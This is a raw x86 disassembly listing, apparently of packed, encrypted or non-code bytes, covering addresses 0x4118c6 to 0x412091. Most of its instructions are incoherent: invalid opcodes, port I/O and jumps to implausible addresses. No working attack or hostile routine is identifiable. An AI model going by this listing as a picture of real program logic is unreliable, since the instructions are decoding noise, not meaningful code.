  4118c6:	sbb    DWORD PTR [esi+0x40449c35],eax
  4118cc:	das    
  4118cd:	bound  ecx,QWORD PTR [ecx+0x42]
  4118d0:	add    BYTE PTR [ebp-0x32cd9056],bh
  4118d6:	aad    0xb5
  4118d8:	jae    0x411891
  4118da:	in     eax,dx
  4118db:	pop    ecx
  4118dc:	mov    dl,0x3c
  4118de:	ficomp WORD PTR [ebx+0x79]
  4118e1:	add    BYTE PTR [ebp-0x641aa29c],al
  4118e7:	or     ch,dh
  4118e9:	lea    ecx,[ebp+0x567ff54a]
  4118ef:	mov    edx,0x6349f19a
  4118f4:	jae    0x411972
  4118f6:	jns    0x4118b8
  4118f8:	lds    ecx,FWORD PTR [ebx-0x2f8f4a0a]
  4118fe:	mov    ah,0x8b
  411900:	cdq    
  411901:	rol    DWORD PTR [edi+ebp*1],1
  411904:	or     al,0x8a
  411906:	ror    BYTE PTR [eax-0x56],cl
  411909:	dec    ecx
  41190a:	test   DWORD PTR [esi-0x55efb63a],eax
  411910:	div    DWORD PTR [esi+edx*4+0x7f]
  411914:	sub    al,0xc2
  411916:	(bad)  
  411917:	fmul   st,st(1)
  411919:	xor    eax,0xc51f837d
  41191e:	aaa    
  41191f:	mov    eax,0xe5abba7c
  411924:	mov    ch,0x29
  411926:	mov    ds:0x2ec6a001,eax
  41192b:	dec    edi
  41192c:	es in  al,0x8b
  41192f:	add    ebx,DWORD PTR [ebx+0x4d9c9498]
  411935:	push   ebx
  411936:	sub    al,0x33
  411938:	ret    0x5120
  41193b:	jle    0x411977
  41193d:	xchg   edx,eax
  41193e:	icebp  
  41193f:	sub    eax,0x8f05eaa
  411944:	and    eax,0xe847d91f
  411949:	inc    ecx
  41194a:	out    0x41,al
  41194c:	test   eax,0xdd4bd029
  411951:	out    0x19,eax
  411953:	dec    edi
  411954:	call   0xd9c46639
  411959:	ins    DWORD PTR es:[edi],dx
  41195a:	push   edi
  41195b:	faddp  st(7),st
  41195d:	sbb    BYTE PTR [ebp+0x5828829f],0x17
  411964:	inc    eax
  411965:	push   edi
  411966:	dec    edx
  411967:	ja     0x4118ed
  411969:	jnp    0x411973
  41196b:	or     BYTE PTR [edx],ah
  41196d:	scas   al,BYTE PTR es:[edi]
  41196e:	dec    edx
  41196f:	pop    ecx
  411970:	lea    ecx,[ebx]
  411972:	stos   DWORD PTR es:[edi],eax
  411973:	in     eax,dx
  411974:	lds    edi,FWORD PTR [edi+0x7fdd5de4]
  41197a:	dec    edx
  41197b:	sbb    ebp,DWORD PTR [ebx]
  41197d:	sub    BYTE PTR [esp+edx*2+0x1bed5ce4],0x82
  411985:	cdq    
  411986:	sbb    cl,BYTE PTR [edx-0x58]
  411989:	sahf   
  41198a:	mov    eax,ds:0xb11bd26
  41198f:	(bad)  
  411990:	in     eax,0xe8
  411992:	dec    edx
  411993:	dec    ebp
  411994:	jnp    0x4119d7
  411996:	push   edi
  411997:	jbe    0x411a10
  411999:	fadd   st(5),st
  41199b:	sahf   
  41199c:	pop    es
  41199d:	xchg   BYTE PTR [edx+ecx*8-0x77],al
  4119a1:	ucomiss xmm3,DWORD PTR [esi+ebx*4-0x16]
  4119a6:	cmp    BYTE PTR [edi-0x7],dl
  4119a9:	sbb    BYTE PTR [ecx+0x2c],cl
  4119ac:	test   DWORD PTR [ecx],esp
  4119ae:	int3   
  4119af:	lahf   
  4119b0:	popf   
  4119b1:	pusha  
  4119b2:	lods   al,BYTE PTR ds:[esi]
  4119b3:	arpl   ax,bp
  4119b5:	hlt    
  4119b6:	inc    esp
  4119b7:	jmp    0x4119d9
  4119b9:	std    
  4119ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119bb:	cmp    DWORD PTR [edi-0xf808082],ebp
  4119c1:	pop    eax
  4119c2:	cmp    cl,ah
  4119c4:	out    0x5e,al
  4119c6:	adc    bh,ch
  4119c8:	sub    ebp,DWORD PTR [ebp+0xe]
  4119cb:	pop    eax
  4119cc:	push   ebp
  4119cd:	retf   0x60d6
  4119d0:	sbb    dh,BYTE PTR [edx*2-0x3cbef62e]
  4119d7:	ins    DWORD PTR es:[edi],dx
  4119d8:	ret    0x2f54
  4119db:	popa   
  4119dc:	sub    al,0x7a
  4119de:	mov    eax,0xe4deb909
  4119e3:	xor    DWORD PTR [eax+edi*1-0x6fe9765c],esp
  4119ea:	fidivr DWORD PTR [eax+0x18a36e05]
  4119f0:	neg    DWORD PTR [esi]
  4119f2:	jle    0x411993
  4119f4:	push   esi
  4119f5:	addr16 ss xchg edx,eax
  4119f8:	inc    eax
  4119f9:	scas   eax,DWORD PTR es:[edi]
  4119fa:	or     al,0xf2
  4119fc:	and    DWORD PTR [edx-0x58],edx
  4119ff:	bound  esi,QWORD PTR [esi+0x6c]
  411a02:	adc    dl,BYTE PTR [ebp*4+0x44aad8f7]
  411a09:	scas   al,BYTE PTR es:[edi]
  411a0a:	je     0x411a2f
  411a0c:	daa    
  411a0d:	cmc    
  411a0e:	cmp    eax,0x38b69e54
  411a13:	ds ja  0x4119be
  411a16:	mov    ah,0xd2
  411a18:	mov    DWORD PTR [ebp-0x167a9ef2],esi
  411a1e:	sub    ebx,DWORD PTR [esi-0x35]
  411a21:	ret    
  411a22:	xchg   esp,eax
  411a23:	lock jmp 0x411a39
  411a26:	jg     0x411a9b
  411a28:	adc    eax,0x832ca1ff
  411a2d:	test   eax,0x693887f
  411a32:	hlt    
  411a33:	in     al,0xbf
  411a35:	push   ebp
  411a36:	xchg   ecx,eax
  411a37:	clc    
  411a38:	push   cs
  411a39:	out    0x5c,eax
  411a3b:	inc    edi
  411a3c:	mov    ecx,0x9eadba62
  411a41:	mov    ds,WORD PTR ds:0x6952a915
  411a47:	fisttp QWORD PTR [ebx+0x65095901]
  411a4d:	mov    cl,0x5d
  411a4f:	out    dx,eax
  411a50:	(bad)  
  411a52:	mov    edx,0x7ad82145
  411a57:	mov    eax,0x11b0d636
  411a5c:	push   0x7b
  411a5e:	iret   
  411a5f:	sbb    eax,0xfaae8428
  411a64:	pusha  
  411a65:	pop    esi
  411a66:	or     BYTE PTR [ebx+eax*4-0x39d43956],0x6c
  411a6e:	jecxz  0x411aa3
  411a70:	jns    0x411a9e
  411a72:	sar    DWORD PTR ds:0x5877fd63,1
  411a78:	jge    0x411aad
  411a7a:	outs   dx,BYTE PTR ds:[esi]
  411a7b:	and    eax,0xeeaaf323
  411a80:	push   ebp
  411a81:	fxch   st(0)
  411a83:	mov    dl,0x6b
  411a85:	sti    
  411a86:	xchg   BYTE PTR [edx-0x2ad5c10a],dl
  411a8c:	mov    ch,0x2f
  411a8e:	int    0x54
  411a90:	xor    ch,0x4e
  411a93:	call   0xb66cc8a9
  411a98:	pop    ebp
  411a99:	in     eax,dx
  411a9a:	mov    ah,0xbc
  411a9c:	js     0x411aad
  411a9e:	mov    ecx,0xe7137ed6
  411aa3:	pop    edx
  411aa4:	test   DWORD PTR [edi],edi
  411aa6:	popf   
  411aa7:	jns    0x411af0
  411aa9:	and    ecx,DWORD PTR [eax+0x718bbdf6]
  411aaf:	inc    edi
  411ab0:	(bad)  
  411ab1:	xchg   ebp,eax
  411ab2:	xor    eax,DWORD PTR [ebp+0x2944c92e]
  411ab8:	pop    esp
  411ab9:	and    ebp,esi
  411abb:	loop   0x411ada
  411abd:	push   ebp
  411abe:	popf   
  411abf:	jmp    0x411b1d
  411ac1:	icebp  
  411ac2:	adc    BYTE PTR [edx-0x4d40328c],dh
  411ac8:	jp     0x411aaa
  411aca:	js     0x411b40
  411acc:	jle    0x411ad3
  411ace:	push   0xffffff9b
  411ad0:	dec    esi
  411ad1:	pop    ebx
  411ad2:	sub    eax,0xd620e259
  411ad7:	adc    cl,BYTE PTR [edi-0x2e9877f3]
  411add:	shr    BYTE PTR [esi+0x47],0xb9
  411ae1:	stc    
  411ae2:	fistp  DWORD PTR [ebp+0x1c85c8c]
  411ae8:	retf   0xb388
  411aeb:	sbb    al,0x42
  411aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aee:	mov    al,ds:0xcf93b70f
  411af3:	sbb    esi,ebx
  411af5:	(bad)  
  411af6:	popa   
  411af7:	cli    
  411af8:	retf   
  411af9:	sub    eax,0xff425499
  411afe:	(bad)  
  411aff:	sbb    eax,0x41440c36
  411b04:	std    
  411b05:	inc    ebp
  411b06:	mov    BYTE PTR [edi-0x4a45046d],dh
  411b0c:	xchg   ecx,eax
  411b0d:	jl     0x411b83
  411b0f:	fwait
  411b10:	into   
  411b11:	dec    edx
  411b12:	jmp    0x411ab4
  411b14:	mov    eax,0x59337d92
  411b19:	ja     0x411afe
  411b1b:	jb     0x411b0a
  411b1d:	add    al,0x14
  411b1f:	sub    DWORD PTR [ecx-0x21f049dc],edx
  411b25:	jne    0x411abb
  411b27:	fiadd  DWORD PTR [ecx-0x2c2e0d25]
  411b2d:	mov    ah,0x5b
  411b2f:	mov    al,0x46
  411b31:	(bad)  
  411b32:	cmp    al,0x7d
  411b34:	dec    eax
  411b35:	es stc 
  411b37:	shr    DWORD PTR [ecx+0x6611145c],1
  411b3d:	mov    al,0x5b
  411b3f:	int    0x78
  411b41:	jp     0x411b44
  411b43:	mov    edi,0x240f3e6e
  411b48:	push   esi
  411b49:	hlt    
  411b4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b4b:	add    ebp,DWORD PTR [ecx-0x1e281a91]
  411b51:	cwde   
  411b52:	jns    0x411b07
  411b54:	ss out dx,eax
  411b56:	retf   
  411b57:	inc    ebx
  411b58:	pop    edx
  411b59:	js     0x411ba8
  411b5b:	xor    BYTE PTR [edi],bl
  411b5d:	out    0xd1,al
  411b5f:	adc    BYTE PTR [edi],bl
  411b61:	add    BYTE PTR [ebx+0x74],bl
  411b64:	pop    edx
  411b65:	dec    edi
  411b66:	xor    bh,BYTE PTR [eax+0x10]
  411b69:	xor    esp,DWORD PTR [ebx-0x4825c228]
  411b6f:	popf   
  411b70:	jo     0x411afd
  411b72:	jnp    0x411bb1
  411b74:	jmp    0xa34a7eea
  411b79:	in     al,0x3f
  411b7b:	or     eax,0xddb82279
  411b80:	test   DWORD PTR [eax-0x152dd4b3],ebp
  411b86:	jmp    0x3506:0x555dad40
  411b8d:	aad    0xfa
  411b8f:	arpl   WORD PTR [ecx+0x2f],ax
  411b92:	dec    ebp
  411b93:	ja     0x411b9a
  411b95:	mov    ecx,0xd8918992
  411b9a:	fild   DWORD PTR ds:0x4349e580
  411ba0:	add    dh,bh
  411ba2:	adc    BYTE PTR ds:0x1a81e23a,0xcb
  411ba9:	test   BYTE PTR ss:[ecx],0xda
  411bad:	pop    esp
  411bae:	and    ebx,edx
  411bb0:	xor    al,0x70
  411bb2:	xor    edx,DWORD PTR [esi]
  411bb4:	mov    bl,bl
  411bb6:	add    bh,BYTE PTR [edi+0x58a3d624]
  411bbc:	fidiv  DWORD PTR [edx]
  411bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bbf:	inc    esi
  411bc0:	dec    eax
  411bc1:	call   0x51b6:0x41c1b17
  411bc8:	outs   dx,BYTE PTR ds:[esi]
  411bc9:	or     ch,BYTE PTR [edx-0x5c]
  411bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bcd:	int    0xe2
  411bcf:	stos   BYTE PTR es:[edi],al
  411bd0:	scas   al,BYTE PTR es:[edi]
  411bd1:	mov    cl,0xa9
  411bd3:	cmp    BYTE PTR [ecx],ch
  411bd5:	popa   
  411bd6:	jno    0x411b91
  411bd8:	jns    0x411bb9
  411bda:	and    BYTE PTR [ebp+0x6356288d],dl
  411be0:	cli    
  411be1:	xor    DWORD PTR [ecx-0x45],edx
  411be4:	fistp  DWORD PTR [esi+ebx*4-0x23]
  411be8:	outs   dx,BYTE PTR ds:[esi]
  411be9:	mov    esi,DWORD PTR [ebx+0x549e44da]
  411bef:	sub    al,0xb5
  411bf1:	cmp    ecx,DWORD PTR [esi+ebx*1]
  411bf4:	sbb    eax,DWORD PTR [esi+0x700047da]
  411bfa:	ret    0x266d
  411bfd:	dec    esi
  411bfe:	sub    BYTE PTR [edi+0x2948c60],al
  411c04:	inc    edi
  411c05:	sub    BYTE PTR [ecx-0x5c],cl
  411c08:	mov    edi,0x3f7010e4
  411c0d:	sbb    DWORD PTR [edi],esi
  411c0f:	sar    DWORD PTR [ebp-0x62],1
  411c12:	pushf  
  411c13:	pop    ebp
  411c14:	push   edx
  411c15:	cs inc edi
  411c17:	dec    ebp
  411c18:	push   edi
  411c19:	int3   
  411c1a:	mov    al,0xfd
  411c1c:	pop    esp
  411c1d:	inc    edx
  411c1e:	xchg   edx,eax
  411c1f:	icebp  
  411c20:	lods   eax,DWORD PTR ds:[esi]
  411c21:	sub    BYTE PTR [edx+0x13c3038c],bl
  411c27:	xchg   ebp,eax
  411c28:	sub    ecx,DWORD PTR [esi]
  411c2a:	mov    edi,0xc9a26b1b
  411c2f:	pop    edi
  411c30:	pop    esp
  411c31:	sahf   
  411c32:	cmc    
  411c33:	popf   
  411c34:	(bad)
  411c37:	add    BYTE PTR [esp+edx*4+0x44],0xa6
  411c3c:	push   0xfffffff4
  411c3e:	xchg   esp,eax
  411c3f:	mov    bl,0x19
  411c41:	sahf   
  411c42:	mov    edx,0x1868c74d
  411c47:	push   edx
  411c48:	inc    DWORD PTR [ecx+0x3c390ae5]
  411c4e:	mov    ds:0x87f0139e,eax
  411c53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c54:	fimul  DWORD PTR [ebx-0x44]
  411c57:	(bad)  
  411c58:	and    dl,BYTE PTR [esi-0x4ed57bdb]
  411c5e:	push   esi
  411c5f:	pop    ebx
  411c60:	cmp    eax,0x3369572e
  411c65:	jnp    0x411c61
  411c67:	jb     0x411cae
  411c69:	jge    0x26423cf1
  411c6f:	jns    0x411c12
  411c71:	sub    edx,esp
  411c73:	js     0x411c70
  411c75:	inc    ebp
  411c76:	xor    ch,BYTE PTR [ebx+eiz*8]
  411c79:	lods   al,BYTE PTR ds:[esi]
  411c7a:	or     eax,0xb2b02d5f
  411c7f:	ret    0x568d
  411c82:	std    
  411c83:	test   al,0x6a
  411c85:	popf   
  411c86:	pop    es
  411c87:	mov    al,ds:0xe4103ac6
  411c8c:	cwde   
  411c8d:	hlt    
  411c8e:	cdq    
  411c8f:	aad    0xa8
  411c91:	ret    0xfff1
  411c94:	test   BYTE PTR [ebx*2-0x4d4452f7],0x71
  411c9c:	xor    ecx,eax
  411c9e:	push   DWORD PTR es:[eax-0x1ca4408b]
  411ca5:	rcr    DWORD PTR [eax],1
  411ca7:	aaa    
  411ca8:	stc    
  411ca9:	into   
  411caa:	aas    
  411cab:	or     al,0xd7
  411cad:	or     dh,bh
  411caf:	sub    eax,0xa99aa771
  411cb4:	or     ecx,DWORD PTR [esi]
  411cb6:	jmp    0x597d:0xd775c609
  411cbd:	out    dx,eax
  411cbe:	es and eax,0xe7ebfffa
  411cc4:	pop    dx
  411cc6:	inc    esi
  411cc7:	push   ebx
  411cc8:	(bad)  
  411cca:	js     0x411ca1
  411ccc:	js     0x411cad
  411cce:	dec    esp
  411ccf:	lods   eax,DWORD PTR ds:[esi]
  411cd0:	mov    ds:0x60f8324a,eax
  411cd5:	or     dl,BYTE PTR [edx-0x7a]
  411cd8:	or     eax,0x7e81d2cf
  411cdd:	aas    
  411cde:	pop    ebp
  411cdf:	pop    ss
  411ce0:	stc    
  411ce1:	dec    eax
  411ce2:	add    al,0x59
  411ce4:	retf   
  411ce5:	out    dx,eax
  411ce6:	lods   eax,DWORD PTR ds:[esi]
  411ce7:	ja     0x411d45
  411ce9:	mov    al,ds:0xaf69b6ff
  411cee:	pop    esp
  411cef:	pop    ebx
  411cf0:	pop    ecx
  411cf1:	sbb    BYTE PTR [edi],ch
  411cf3:	je     0x411d28
  411cf5:	adc    BYTE PTR [ebx+edi*8],ch
  411cf8:	xchg   edi,eax
  411cf9:	or     al,BYTE PTR [edi+0x561efea2]
  411cff:	push   ebp
  411d00:	(bad)  [ebx+eiz*4]
  411d03:	mov    bh,0xf7
  411d05:	mov    DWORD PTR [ebp+0x44],esp
  411d08:	fsubr  QWORD PTR [ecx]
  411d0a:	shl    ch,0xe8
  411d0d:	pop    ebx
  411d0e:	jg     0x411d52
  411d10:	mov    ebp,0x7d1a4e4e
  411d15:	(bad)  
  411d16:	push   ebp
  411d17:	add    DWORD PTR ds:0x2dfefe2f,0xffffff9b
  411d1e:	dec    ecx
  411d1f:	add    al,0xa6
  411d21:	sub    al,0x69
  411d23:	mov    ch,0xa3
  411d25:	mov    edi,0xd665c2d
  411d2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d2b:	pushf  
  411d2c:	xchg   edx,eax
  411d2d:	xchg   DWORD PTR [eax],edx
  411d2f:	scas   al,BYTE PTR es:[edi]
  411d30:	in     eax,dx
  411d31:	adc    DWORD PTR ds:0xec217134,esi
  411d37:	cdq    
  411d38:	mov    ds:0xd2f574a5,al
  411d3d:	repz xchg esp,eax
  411d3f:	sbb    eax,0x7e299116
  411d44:	mov    ds,WORD PTR [ebp-0x6970221f]
  411d4a:	push   esp
  411d4b:	out    dx,al
  411d4c:	xor    BYTE PTR [edx+0x79],0xf4
  411d50:	repz add BYTE PTR [ebx-0x6d],bh
  411d54:	and    dh,bh
  411d56:	shl    DWORD PTR [ecx+0xc126be6],1
  411d5c:	cmp    esi,edi
  411d5e:	lods   al,BYTE PTR ds:[esi]
  411d5f:	test   eax,0xa542a3f8
  411d64:	sar    ah,0xa8
  411d67:	and    bh,BYTE PTR [eax+0x341e20fb]
  411d6d:	into   
  411d6e:	and    eax,0x4845996
  411d73:	call   0x306fd13
  411d78:	cmp    ecx,edx
  411d7a:	test   eax,0x820a17f
  411d7f:	int    0x5e
  411d81:	aad    0x93
  411d83:	xor    eax,0xa0a97df9
  411d88:	or     eax,0x4db6e4dc
  411d8d:	and    dl,BYTE PTR [esi+0x27]
  411d90:	push   ss
  411d91:	imul   edx,DWORD PTR [ecx+eax*4+0x1cc818ba],0x78
  411d99:	ja     0x411d26
  411d9b:	lods   al,BYTE PTR ds:[esi]
  411d9c:	xchg   edx,eax
  411d9d:	mov    ds:0x1a9bfbf1,al
  411da2:	push   ds
  411da3:	or     BYTE PTR [esp+ecx*2],cl
  411da6:	sbb    ah,BYTE PTR [ebp+esi*1+0x2451ad95]
  411dad:	cmp    eax,0xe1580f5
  411db2:	mov    ebp,0x16067744
  411db7:	push   ss
  411db8:	aad    0xa0
  411dba:	test   ebp,0x946eef34
  411dc0:	rcl    BYTE PTR ds:0x1a6a4ecf,0x4e
  411dc7:	retf   0x7ca3
  411dca:	cmp    edx,DWORD PTR [esi-0x66]
  411dcd:	push   eax
  411dce:	cdq    
  411dcf:	iret   
  411dd0:	jp     0x411dee
  411dd2:	les    edx,FWORD PTR [eax+0x31a1c9ee]
  411dd8:	sub    ch,0x85
  411ddb:	outs   dx,BYTE PTR ds:[esi]
  411ddc:	call   0xf136548c
  411de1:	dec    ecx
  411de2:	addr16 jge 0x411e22
  411de5:	hlt    
  411de6:	pushf  
  411de7:	mov    fs,edi
  411de9:	xor    al,0xa7
  411deb:	inc    esp
  411dec:	fwait
  411ded:	and    esi,edx
  411def:	xchg   ebx,eax
  411df0:	in     al,dx
  411df1:	and    DWORD PTR [ecx],ebx
  411df3:	hlt    
  411df4:	popa   
  411df5:	adc    cl,bl
  411df7:	dec    ebp
  411df8:	iret   
  411df9:	lds    edi,FWORD PTR [esi+0x34]
  411dfc:	test   al,0x14
  411dfe:	cmp    eax,0x2afde9eb
  411e03:	jecxz  0x411e37
  411e05:	xchg   bl,dh
  411e07:	cmp    ah,BYTE PTR [edx+0x31]
  411e0a:	add    cl,cl
  411e0c:	cmp    eax,0xbd6496b0
  411e11:	jl     0x411e8a
  411e13:	mov    ebx,0x94bcc2ac
  411e18:	mov    ecx,0x9a693456
  411e1d:	pop    esp
  411e1e:	out    0xf5,eax
  411e20:	and    al,0x4
  411e22:	imul   ecx,DWORD PTR [edi-0x48d339a5],0x8c090dfe
  411e2c:	rcr    BYTE PTR [ebx+ecx*8-0x51],cl
  411e30:	cmp    DWORD PTR [esi+0x2681ad41],esp
  411e36:	retf   
  411e37:	scas   al,BYTE PTR es:[edi]
  411e38:	mov    ch,BYTE PTR [eax]
  411e3a:	push   esp
  411e3b:	jle    0x411e3d
  411e3d:	pusha  
  411e3e:	out    dx,al
  411e3f:	int    0x19
  411e41:	clc    
  411e42:	loope  0x411e47
  411e44:	mov    al,ds:0x3f731af
  411e49:	sub    al,0x94
  411e4b:	mov    DWORD PTR [edi],ebx
  411e4d:	pop    edx
  411e4e:	cmp    eax,0x3f928d5e
  411e53:	rcr    esp,1
  411e55:	cmp    ebp,ebp
  411e57:	jecxz  0x411e1a
  411e59:	pushf  
  411e5a:	and    al,0xb5
  411e5c:	es mov dh,0x80
  411e5f:	scas   eax,DWORD PTR es:[edi]
  411e60:	add    bh,BYTE PTR [edx-0x50]
  411e63:	mov    ah,0x8
  411e65:	inc    eax
  411e66:	aad    0xe4
  411e68:	aad    0x94
  411e6a:	dec    ecx
  411e6b:	fist   DWORD PTR [eax+0x133da8a8]
  411e71:	loop   0x411e17
  411e73:	sub    DWORD PTR [ebx],edi
  411e75:	lds    ebp,FWORD PTR [esi]
  411e77:	shl    dl,0xae
  411e7a:	inc    edx
  411e7b:	(bad)  
  411e7d:	mov    ah,dl
  411e7f:	push   eax
  411e80:	mov    esp,0x23caab64
  411e85:	jecxz  0x411e48
  411e87:	or     ebx,esp
  411e89:	out    0x2f,eax
  411e8b:	cmovb  eax,ebx
  411e8e:	xchg   ebp,eax
  411e8f:	mov    eax,ds:0x17e1cb60
  411e94:	lahf   
  411e95:	lds    ebx,FWORD PTR [ecx+0x2c]
  411e98:	xor    al,0x7
  411e9a:	mov    eax,ds:0x5913455e
  411e9f:	out    dx,eax
  411ea0:	mov    dl,0x9a
  411ea2:	je     0x411ea6
  411ea4:	shl    BYTE PTR [edi-0x12613cfa],1
  411eaa:	or     DWORD PTR [ebx+eax*8],esi
  411ead:	or     edi,DWORD PTR [edx-0x5c93ddde]
  411eb3:	dec    ebp
  411eb4:	and    DWORD PTR [edx+0x4d1b1f8],ebx
  411eba:	hlt    
  411ebb:	(bad)  
  411ebc:	xlat   BYTE PTR ds:[ebx]
  411ebd:	dec    edx
  411ebe:	(bad)  
  411ebf:	xchg   DWORD PTR [esi+eiz*2+0x75],ecx
  411ec3:	in     al,dx
  411ec4:	push   ebx
  411ec5:	(bad)  
  411ec6:	sti    
  411ec7:	jno    0x411ea8
  411ec9:	test   DWORD PTR [ebp-0x6905d9fc],edi
  411ecf:	dec    eax
  411ed0:	mov    esp,0xb9878301
  411ed5:	cmp    DWORD PTR [edi],ebp
  411ed7:	sbb    esp,DWORD PTR [edx+0x16]
  411eda:	adc    al,0xaf
  411edc:	into   
  411edd:	jbe    0x411f07
  411edf:	dec    ecx
  411ee0:	aad    0xa5
  411ee2:	xor    DWORD PTR [edi+0x7e],0xffffffe8
  411ee6:	adc    ebx,DWORD PTR [edi+eax*4]
  411ee9:	inc    BYTE PTR [ebx-0x7fb0a7f]
  411eef:	(bad)  
  411ef1:	jmp    0x411f3b
  411ef3:	sub    dl,dh
  411ef5:	cs push 0xfd9a2d18
  411efb:	push   0xe7384728
  411f00:	retf   0x27b4
  411f03:	add    dh,BYTE PTR [esi+0x8e53b6f]
  411f09:	aad    0x39
  411f0b:	das    
  411f0c:	(bad)  
  411f0d:	sbb    BYTE PTR gs:[edx],0x18
  411f11:	ins    DWORD PTR es:[edi],dx
  411f12:	out    0x23,eax
  411f14:	popa   
  411f15:	int3   
  411f16:	adc    BYTE PTR [ecx],dl
  411f18:	jno    0x411ecf
  411f1a:	enter  0x5e0a,0x5c
  411f1e:	pop    ebx
  411f1f:	daa    
  411f20:	test   al,0xac
  411f22:	into   
  411f23:	fcmovbe st,st(1)
  411f25:	pop    ss
  411f26:	xchg   esp,eax
  411f27:	add    al,0x65
  411f29:	out    dx,eax
  411f2a:	lahf   
  411f2b:	jns    0x411f30
  411f2d:	add    eax,0x263640b4
  411f32:	xchg   ebx,eax
  411f33:	cmp    DWORD PTR [edx-0x4a],ebp
  411f36:	jle    0x411eed
  411f38:	and    edx,0xffffffff
  411f3b:	(bad)  [esi]
  411f3d:	xor    al,0x93
  411f3f:	mov    ebx,0x2842be89
  411f44:	dec    edi
  411f45:	mov    al,0xbf
  411f47:	out    dx,al
  411f48:	in     al,0x3
  411f4a:	dec    edi
  411f4b:	jne    0x411f52
  411f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f4e:	(bad)  
  411f4f:	ficom  DWORD PTR [eax+0x54707152]
  411f55:	aas    
  411f56:	jmp    0x411f83
  411f58:	sahf   
  411f59:	sbb    al,0xb0
  411f5b:	cmp    eax,0x75f35b1
  411f60:	xor    al,BYTE PTR [ebp-0x7d811405]
  411f66:	aad    0x66
  411f68:	int3   
  411f69:	into   
  411f6a:	rcl    BYTE PTR [edx+0x7b],cl
  411f6d:	ss and al,0x87
  411f70:	aaa    
  411f71:	ret    
  411f72:	push   ebp
  411f73:	js     0x411ef9
  411f75:	sub    esp,edx
  411f77:	aaa    
  411f78:	sbb    DWORD PTR [ebx-0x5d507282],ebp
  411f7e:	into   
  411f7f:	xor    eax,ebx
  411f81:	daa    
  411f82:	cdq    
  411f83:	pop    ecx
  411f84:	das    
  411f85:	mov    edx,0x1139caa9
  411f8a:	inc    eax
  411f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f8c:	push   es
  411f8d:	sbb    al,0x5f
  411f8f:	jno    0x411f38
  411f91:	ret    
  411f92:	add    DWORD PTR [ebp+0x2ebb0bec],esp
  411f98:	dec    edi
  411f99:	loop   0x411f2a
  411f9b:	mov    bl,0xd8
  411f9d:	in     al,0xc0
  411f9f:	int3   
  411fa0:	jmp    0x304d:0x7fbbdfe2
  411fa7:	lods   eax,DWORD PTR ds:[esi]
  411fa8:	sbb    eax,0x33696c6b
  411fad:	outs   dx,BYTE PTR ds:[esi]
  411fae:	mov    ebx,0xbb1f28bd
  411fb3:	mov    al,BYTE PTR [edi-0x18]
  411fb6:	jns    0x411fad
  411fb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fb9:	lds    ecx,FWORD PTR [ebx-0x1]
  411fbc:	mov    cl,0x97
  411fbe:	add    eax,0x8d160d39
  411fc3:	inc    eax
  411fc4:	sti    
  411fc5:	outs   dx,BYTE PTR ds:[esi]
  411fc6:	rol    DWORD PTR [edx+edx*4],0x60
  411fca:	stos   DWORD PTR es:[edi],eax
  411fcb:	cmp    ecx,esi
  411fcd:	push   edx
  411fce:	xor    ebp,DWORD PTR [ebx+0x4e]
  411fd1:	and    BYTE PTR ss:[edx+0xf],0x7f
  411fd6:	imul   esi,ecx,0x75
  411fd9:	mov    ecx,0x7f7a70a9
  411fde:	mov    ebx,0x19c359d0
  411fe3:	jbe    0x412019
  411fe5:	loop   0x411f69
  411fe7:	or     eax,edi
  411fe9:	adc    esp,DWORD PTR cs:[esp+0x3a]
  411fee:	cmp    eax,0xda553685
  411ff3:	vpunpckhdq xmm5,xmm5,xmm5
  411ff7:	in     eax,0xda
  411ff9:	xor    al,0xd2
  411ffb:	xor    al,BYTE PTR [esi+0x66739998]
  412001:	test   al,0x21
  412003:	mov    eax,ds:0xe492969d
  412008:	mov    esi,0x55bc2a9a
  41200d:	push   edi
  41200e:	pop    DWORD PTR ss:[esi-0x39cda341]
  412015:	outs   dx,DWORD PTR ds:[esi]
  412016:	repz pop esp
  412018:	(bad)  
  412019:	xor    DWORD PTR [esi-0x7e],edx
  41201c:	and    ah,BYTE PTR ss:[eax]
  41201f:	(bad)  
  412020:	loope  0x411fe0
  412022:	push   ecx
  412023:	scas   eax,DWORD PTR es:[edi]
  412024:	ds fisub WORD PTR gs:[ecx]
  412028:	jecxz  0x411fd6
  41202a:	ss jns 0x412060
  41202d:	fnstenv [esi]
  41202f:	repnz mov ah,0xcd
  412032:	xchg   ecx,eax
  412033:	loopne 0x411ffc
  412035:	pop    ebp
  412036:	popf   
  412037:	fcom   st(1)
  412039:	ds loop 0x412076
  41203c:	xor    DWORD PTR [ebp+0x23],edx
  41203f:	fild   WORD PTR [esi]
  412041:	jno    0x41205e
  412043:	jno    0x412012
  412045:	push   ebp
  412046:	mov    esp,0x3385ecd3
  41204b:	std    
  41204c:	outs   dx,BYTE PTR ds:[esi]
  41204d:	dec    edx
  41204e:	pop    ss
  41204f:	or     BYTE PTR [ecx-0x29],cl
  412052:	inc    ecx
  412053:	cld    
  412054:	repz xlat BYTE PTR fs:[ebx]
  412057:	mov    cl,0x36
  412059:	and    ebx,edi
  41205b:	pop    ds
  41205c:	push   cs
  41205d:	or     bl,BYTE PTR [eax]
  41205f:	cli    
  412060:	in     al,0xfa
  412062:	lods   eax,DWORD PTR ds:[esi]
  412063:	pop    es
  412064:	cmp    DWORD PTR [edx+edx*1-0x383d8cf6],eax
  41206b:	cli    
  41206c:	inc    esp
  41206d:	xchg   ebx,eax
  41206e:	mov    ah,0x52
  412070:	jmp    0x4120a9
  412072:	add    BYTE PTR [ebp+0x54],bh
  412075:	or     al,0x6e
  412077:	sti    
  412078:	push   0xafc48a26
  41207d:	push   esi
  41207e:	jecxz  0x412000
  412080:	int3   
  412081:	sub    DWORD PTR [ebx+0xa],esi
  412084:	sub    DWORD PTR [esi+0x275b775a],edx
  41208a:	lods   al,BYTE PTR ds:[esi]
  41208b:	sbb    DWORD PTR [ebp-0xaeda3f1],ebx
  412091:	sar    DWORD PTR [eax-0xb],cl
